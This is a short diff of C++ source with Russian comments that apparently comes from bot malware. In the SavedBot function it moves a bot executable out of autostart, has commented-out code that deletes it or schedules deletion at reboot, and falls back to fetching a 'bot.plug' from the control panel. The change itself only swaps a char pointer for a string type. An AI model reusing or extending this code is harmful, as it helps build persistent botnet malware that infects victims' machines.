@@ -388,26 +388,25 @@ static bool SavedBot( BYTE* bodyBotPlug, DWORD sizeBotPlug )
 {
 	PP_DPRINTF( "SavedBot: start" );
 	//сначала пытаемся перенести бота из автозагрузки
-	char* path = BOT::GetBotFullExeName();
+	string path = BOT::GetBotFullExeName();
 	bool res = false;
 	DWORD sizeBot = 0;
 	BYTE* dataBot = 0;
 	bool delDataBot = false;
-	if( File::IsExists(path) ) //в автозагрузке есть бот, загружаем
+	if( File::IsExists(path.t_str()) ) //в автозагрузке есть бот, загружаем
 	{
 		PP_DPRINTF( "SavedBot: переносим бот из автозагрузки" );
-		dataBot = 0;//File::ReadToBufferA( path, sizeBot );
+		dataBot = 0;//File::ReadToBufferA( path.t_str(), sizeBot );
 		delDataBot = true;
 		//удаляем
 		/*
-		pSetFileAttributesA( path, FILE_ATTRIBUTE_NORMAL ); //убираем атрибут для чтения
-		if( pDeleteFileA(path) == 0 ) //если не удалился, то делаем чтобы после ребута удалился
+		pSetFileAttributesA( path.t_str(), FILE_ATTRIBUTE_NORMAL ); //убираем атрибут для чтения
+		if( pDeleteFileA(path.t_str()) == 0 ) //если не удалился, то делаем чтобы после ребута удалился
 		{
-			pMoveFileExA( path, NULL, MOVEFILE_DELAY_UNTIL_REBOOT );
+			pMoveFileExA( path.t_str(), NULL, MOVEFILE_DELAY_UNTIL_REBOOT );
 		}
 		*/
 	}
-	STR::Free(path);
 	if( !dataBot ) //из автозагрузки не удалось перенести, качаем с админки бот плаг
 	{
 		PP_DPRINTF( "SavedBot: ставим bot.plug" );
